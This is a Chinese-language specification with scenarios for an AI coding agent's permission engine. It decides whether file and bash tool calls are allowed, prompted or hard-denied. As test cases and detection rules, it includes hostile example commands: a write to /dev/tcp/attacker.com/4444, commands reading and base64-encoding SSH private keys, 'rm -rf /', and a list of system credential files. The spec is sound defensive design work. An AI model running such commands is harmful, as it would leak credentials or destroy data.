# access-decision Specification

## Purpose
定义决策引擎的行为契约——给定（区域 × 权限 × 操作 × 敏感匹配），返回 auto_allow / deny_hard / prompt 之一，并标注弹窗档位。

## Requirements

### Requirement: 双区域判定

系统 SHALL 把工具目标路径划分为两个信任区域：

- **项目内**（project_inner）：目标路径规范化后位于当前 `<projectRoot>` 之下（含子目录）。符号链接与 `..` 逃逸 MUST 在判定前先规范化为绝对路径。
- **项目外**（project_outer）：其他所有路径。

#### Scenario: 项目内路径判定

- **WHEN** `<projectRoot> = /proj`，工具访问 `/proj/src/x.ts`
- **THEN** 区域判定为 project_inner

#### Scenario: `..` 逃逸规范化

- **WHEN** `<projectRoot> = /proj`，工具访问相对路径 `../outside/x`（相对于 `<projectRoot>`）
- **THEN** 规范化后为 `/outside/x`，区域判定为 project_outer

#### Scenario: 符号链接逃逸规范化

- **WHEN** `/proj/link -> /etc/ssh`，工具访问 `/proj/link/config`
- **THEN** realpath 后为 `/etc/ssh/config`，区域判定为 project_outer（符号链接解析失败时保留原路径判定为 project_inner 并记入审计 note）

### Requirement: 权限声明优先于默认敏感兜底

若目标路径在任何配置中被声明为 `read_write` / `read_only` / `unread`，该声明 MUST 优先于默认敏感路径表的判定。

#### Scenario: 项目内敏感文件被配置覆盖

- **WHEN** 项目配置声明 `"config/.env" = "read_write"`，工具访问 `<proj>/config/.env`（会命中默认敏感规则"env 文件"）
- **THEN** 决策为 auto_allow（配置声明优先于敏感兜底）

#### Scenario: 项目内敏感文件读取免弹

- **WHEN** 项目配置声明 `"src/creds/local.key" = "read_write"`，工具读取该文件
- **THEN** 决策为 auto_allow，不弹窗

### Requirement: read_write 权限语义

系统 MUST 对目标路径被声明为 `read_write` 的情况按以下规则决策：

- **项目内**：读与写都 auto_allow
- **项目外**：首次访问弹三档弹窗（"允许一次 / 会话内允许 / 总是允许"）；已记忆授权后按记忆放行

#### Scenario: 项目内 read_write 读写免弹

- **WHEN** 项目配置声明 `"vendor/**" = "read_write"`，工具读写 `<proj>/vendor/a.txt`
- **THEN** 决策为 auto_allow（读）与 auto_allow（写）

#### Scenario: 项目外 read_write 首次访问弹三档

- **WHEN** 全局配置声明 `"/opt/shared/secrets" = "read_write"`，工具首次读 `/opt/shared/secrets/x`，该路径无授权记忆
- **THEN** 决策为 prompt，tier=three

#### Scenario: 项目外 read_write 已授权后免弹

- **WHEN** 上一场景用户选择"总是允许"，同一项目再次读同一文件
- **THEN** 决策为 auto_allow（授权记忆命中）

### Requirement: read_only 权限语义

系统 MUST 对目标路径被声明为 `read_only` 的情况按以下规则决策：

- 读：auto_allow（区域无关）
- 写：弹三档弹窗（区域无关，因为声明本身就是"要写的话我需要确认"）

#### Scenario: read_only 读免弹

- **WHEN** 全局声明 `"/Users/eliot/.aws" = "read_only"`，工具读该路径下文件
- **THEN** auto_allow

#### Scenario: read_only 写弹三档

- **WHEN** 项目配置声明 `"src/secrets.txt" = "read_only"`，工具写 `<proj>/src/secrets.txt`
- **THEN** prompt，tier=three

### Requirement: unread 权限语义

若目标路径被声明为 `unread`：

- 读 / 写 / delete 都 MUST 决策为 `deny_hard`
- 不弹窗、不可被授权记忆绕过

#### Scenario: 硬拒绝项目内文件

- **WHEN** 项目配置声明 `"src/secrets.txt" = "unread"`，工具读或写该文件
- **THEN** deny_hard，reason 包含"声明为 unread"

#### Scenario: 硬拒绝项目外文件

- **WHEN** 全局配置声明 `"/srv/prod-keys" = "unread"`，工具读 `/srv/prod-keys/a.pem`
- **THEN** deny_hard

#### Scenario: 已授权记忆不能绕过 unread

- **WHEN** 全局 `A = unread`，之前用户对同一路径做过"总是允许"授权
- **THEN** deny_hard（授权记忆在 unread 前不检查）

### Requirement: 未配置路径的行为

系统 MUST 对目标路径未在任何配置中声明的情况按以下规则决策：

- **项目内敏感路径**（命中默认敏感规则）：读与写都 prompt，tier=three（可持久授权；用户显式声明覆盖）
- **项目内非敏感路径**：读与写都 auto_allow（保持 pi 现状行为）
- **项目外敏感路径**：读与写都 prompt，tier=two（不允许"总是允许"）
- **项目外非敏感路径读**：auto_allow
- **项目外非敏感路径写 / delete**：prompt，tier=three（可持久授权；敏感路径已在上一条中锁定 tier=two）

#### Scenario: 未配置项目内普通文件写自动放行

- **WHEN** 无任何配置，工具写 `<proj>/src/main.ts`
- **THEN** auto_allow（保持 pi 现状）

#### Scenario: 未配置项目内敏感文件读弹三档

- **WHEN** 无配置，工具读 `<proj>/.ssh/id_rsa`（命中默认敏感）
- **THEN** prompt，tier=three（提供"总是允许"选项，用户显式声明可覆盖）

#### Scenario: 未配置项目外敏感文件读弹两档

- **WHEN** 无配置，工具读 `~/.ssh/id_rsa`（命中默认敏感）
- **THEN** prompt，tier=two

#### Scenario: 未配置项目外非敏感文件写弹三档

- **WHEN** 无配置，工具写 `/tmp/somefile.txt`
- **THEN** prompt，tier=three（提供"总是允许"选项，持久化到 trusted.json）

### Requirement: 跨源冲突弹窗（仅 unread 相关）

若决策阶段检测到跨源冲突（见 permission-config 的"跨源冲突检测"）且冲突组合**包含 `unread`**，系统 SHALL 强制弹三档弹窗询问用户是否放行，弹窗文案 MUST 说明"存在跨源冲突"。

冲突组合分类：
- **需弹窗询问**（包含 unread）：`unread` vs `read_write`、`unread` vs `read_only`（不论方向、不论层级）
- **静默应用最高优先级**（不含 unread）：`read_write` vs `read_only`、`read_write` vs `read_only`（本地覆盖）——不弹冲突弹窗，使用 local > project > global 优先级直接决策

#### Scenario: 全局 unread 与项目 read_write 冲突

- **WHEN** 全局声明 `/srv = unread`，项目声明 `/srv = read_write`，工具读 `/srv/a`
- **THEN** prompt，tier=three，reason 说明"跨源冲突：全局标记为硬拒绝但项目标记为读写"

#### Scenario: 全局 read_only 与项目 read_write 不弹冲突

- **WHEN** 全局声明 `A = read_only`，项目声明 `A = read_write`，工具写 `A`
- **THEN** 不弹冲突弹窗；按项目优先级应用 `read_write` 决策（项目内 auto_allow）

### Requirement: 敏感文件按文件记忆

敏感文件（无论默认敏感表命中还是配置声明）的授权记忆键 MUST 包含完整路径（非仅目录），不允许"授权同目录全部敏感文件"。

#### Scenario: 同目录下不同敏感文件独立记忆

- **WHEN** 用户对项目外敏感目录 `~/.ssh/` 的 `id_rsa` 选择"总是允许"
- **THEN** 授权仅对 `~/.ssh/id_rsa` 生效，`~/.ssh/known_hosts` 的读取仍需重新授权

### Requirement: 未识别 bash 命令的目标路径

对 bash 工具调用，若 bash-target-extraction capability 无法可靠提取目标路径（复杂命令、变量、管道等），系统 SHALL 将其视为"未配置路径"，决策为 prompt，tier=two，弹窗显示完整命令原文。

#### Scenario: 无法解析的复杂 bash 命令

- **WHEN** bash 命令为 `$(cat $HOME/.ssh/id_rsa | base64) > /tmp/out.txt`
- **THEN** 若 bash-target-extraction 判定为不可靠，决策为 prompt，tier=two，弹窗展示完整命令文本

### Requirement: 网络外带写入目标强制 tier=two

若目标路径匹配以下"网络外带"路径模式之一，且操作为写入（`action === "write"`），系统 MUST 决策为 prompt，tier=two，弹窗不提供"总是允许"选项：

- `/dev/tcp/*`（bash 内建 TCP 套接字）
- `/dev/udp/*`（bash 内建 UDP 套接字）
- `/dev/fd/[0-9]+`（数字文件描述符别名，如 `/dev/fd/3`）

**理由**：`/dev/tcp` 与 `/dev/udp` 是 bash 内建的套接字路径，可被用于网络外带数据（如 `echo payload > /dev/tcp/attacker.com/4444`）。`/dev/fd/[0-9]+` 用于 fd 复用，写入时可能是外带通道。这些路径的写入不能通过"总是允许"持久化授权——用户必须每次确认。

**位置**：本规则 MUST 在默认敏感路径 fallback 之前检查（dev-socket 路径通常不会命中敏感规则表），且 MUST 只针对写入操作生效（读取 `/dev/fd/3` 通常是无害的 fd 复用，不拦截）。

**与既有重定向提取的关系**：bash-target-extraction 已经把 `/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/[0-9]+` 作为普通写目标产出（`extractRedirects` 调用 `isDevSocketOrFd` 判定后仍写入 targets）。本规则在决策层把这些写入目标强制为 tier=two，不改 extractor 的提取行为。

#### Scenario: /dev/tcp 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/tcp/1.2.3.4/4444`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/udp 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/udp/attacker.com/53`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/fd/3 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/fd/3`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/tcp 读取不触发 tier=two

- **WHEN** 无任何配置，工具读取 `/dev/tcp/1.2.3.4/4444`
- **THEN** 决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: /dev/tcp 写入不能持久化授权

- **WHEN** 用户曾对 `/dev/tcp/1.2.3.4/4444` 选择"总是允许"
- **THEN** 授权不被写入 trusted.json，后续同路径写入仍触发 prompt tier=two——dev-socket 写入强制 tier=two 意味着永远无"总是允许"选项

#### Scenario: bash 命令中 dev/tcp 写入目标触发 tier=two

- **WHEN** bash 命令为 `echo payload > /dev/tcp/1.2.3.4/4444`，bash-target-extraction 提取写目标 `/dev/tcp/1.2.3.4/4444`
- **THEN** access-decision 决策为 prompt，tier=two，弹窗展示该 bash 命令与该写目标

### Requirement: 系统机密文件读取判敏感

若目标路径匹配以下"系统机密文件"之一，且未在任何配置中被显式声明为 `read_write` / `read_only` / `unread`，系统 MUST 把该路径判定为命中默认敏感规则表（reason 为 `System credential/config file`）：

- `/etc/shadow`（Unix 用户密码哈希文件）
- `/etc/sudoers`（sudo 提权配置）
- `/etc/master.passwd`（macOS 用户密码哈希文件）
- `/etc/crontab`（cron 调度配置）
- `/etc/cron.d/*`（cron.d 子配置）
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`（cron 定时任务目录）
- `/etc/hosts.allow`（TCP Wrappers 访问控制）
- `/etc/hosts.deny`（TCP Wrappers 访问控制）

**理由**：这些路径是常见 Unix 系统机密文件，泄露后可能导致提权或横向移动。用户对项目外的系统机密文件读取时，决策层应提供 tier=two 弹窗（不可持久化）而非"项目外非敏感文件读"的 auto_allow。

**范围**：本规则只覆盖上述明确列出的系统机密文件。其他 `/etc/**` 路径（如 `/etc/hosts`、`/etc/hostname`、`/etc/passwd`）不被视为敏感——`/etc/passwd` 是公开用户列表，只含非敏感信息（用户名 / UID / GID / home / shell），泄露不影响安全。

**与既有敏感规则的关系**：本规则追加到默认敏感规则表的尾部，既有规则（SSH 密钥、私钥扩展名、env 文件、凭证存储目录、凭证配置文件）的匹配顺序与行为不变，前向兼容。

#### Scenario: /etc/shadow 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/shadow`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /etc/sudoers 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/sudoers`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/master.passwd 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/master.passwd`（macOS）
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/crontab 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/crontab`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/cron.d/ 子文件读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/cron.d/mytask`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/hosts.allow 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/hosts.allow`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/passwd 不判敏感

- **WHEN** 无任何配置，工具读取 `/etc/passwd`
- **THEN** 不命中默认敏感规则，决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: /etc/hosts 不判敏感

- **WHEN** 无任何配置，工具读取 `/etc/hosts`
- **THEN** 不命中默认敏感规则，决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: 用户配置声明覆盖系统机密文件

- **WHEN** 全局配置声明 `"/etc/shadow" = "read_only"`，工具读取 `/etc/shadow`
- **THEN** 决策为 auto_allow（配置声明优先于默认敏感规则）

#### Scenario: 项目内敏感文件读取仍判 tier=three

- **WHEN** 无任何配置，工具读取 `<proj>/.ssh/id_rsa`（既有敏感规则命中）
- **THEN** 决策为 prompt，tier=three（提供"总是允许"选项，用户显式声明可覆盖）——既有规则的行为不变，仅系统机密文件的新规则受 tier=two 约束

### Requirement: tool+pattern 规则检查

决策引擎 SHALL 在 path 解析之前检查 tool+pattern 规则。检查顺序：

1. **deny 规则检查**（最高优先级）：若 resolveRule(toolName, toolPattern) 返回 `action: "deny"`，决策为 `deny_hard`，不检查后续任何规则
2. **path 解析**（现有逻辑不变）：检查 `paths` 表中的声明
3. **allow 规则检查**：若 path 解析未命中且 resolveRule 返回 `action: "allow"`，则：
   - **敏感路径硬底线**：若目标路径命中敏感规则表（默认敏感路径 或 配置声明的敏感），即使 allow 规则命中也 MUST 弹 prompt（tier 按敏感默认规则决定）
   - **非敏感路径**：决策为 `auto_allow`，跳过默认兜底
4. **默认兜底**（现有逻辑不变）：未命中任何规则时按区域+敏感默认规则决策

**关键约束**：allow 规则不绕过敏感路径检查——这是安全硬底线。用户配置 `Bash(git *)` 允许后，若 `git` 命令的操作目标路径命中敏感规则（如 `git push` 到远程含敏感路径），仍会弹窗。

**deny 规则是无条件的**：不论路径是否敏感、不论区域、不论操作，deny 命中即硬拒绝。

#### Scenario: allow 规则跳过非敏感路径弹窗

- **WHEN** 配置声明 `{ "tool": "bash", "pattern": "git *", "action": "allow" }`，bash 命令为 `git status`，无 paths 声明
- **THEN** 决策为 auto_allow（allow 规则命中，非敏感路径）

#### Scenario: allow 规则不绕过敏感路径

- **WHEN** 配置声明 `{ "tool": "bash", "pattern": "git *", "action": "allow" }`，bash 命令为 `cat ~/.ssh/id_rsa`，无 paths 声明
- **THEN** 决策为 prompt（allow 规则命中但目标路径敏感，敏感硬底线生效）

#### Scenario: deny 规则无条件拒绝

- **WHEN** 配置声明 `{ "tool": "bash", "pattern": "rm *", "action": "deny" }`，bash 命令为 `rm -rf /`
- **THEN** 决策为 deny_hard（deny 无条件，不论路径是否敏感）

#### Scenario: deny 优先于 allow（同 tool+pattern）

- **WHEN** 全局声明 `{ "tool": "bash", "pattern": "git *", "action": "allow" }`，项目声明 `{ "tool": "bash", "pattern": "git *", "action": "deny" }`
- **THEN** 决策为 deny_hard（deny 优先于 allow，不论优先级来源）

#### Scenario: path 声明优先于 allow 规则

- **WHEN** 配置声明 `{ "paths": { "/etc": "unread" } }` 和 `{ "tool": "bash", "pattern": "cat *", "action": "allow" }`，bash 命令为 `cat /etc/passwd`
- **THEN** 决策为 deny_hard（path 声明 unread 优先于 allow 规则）
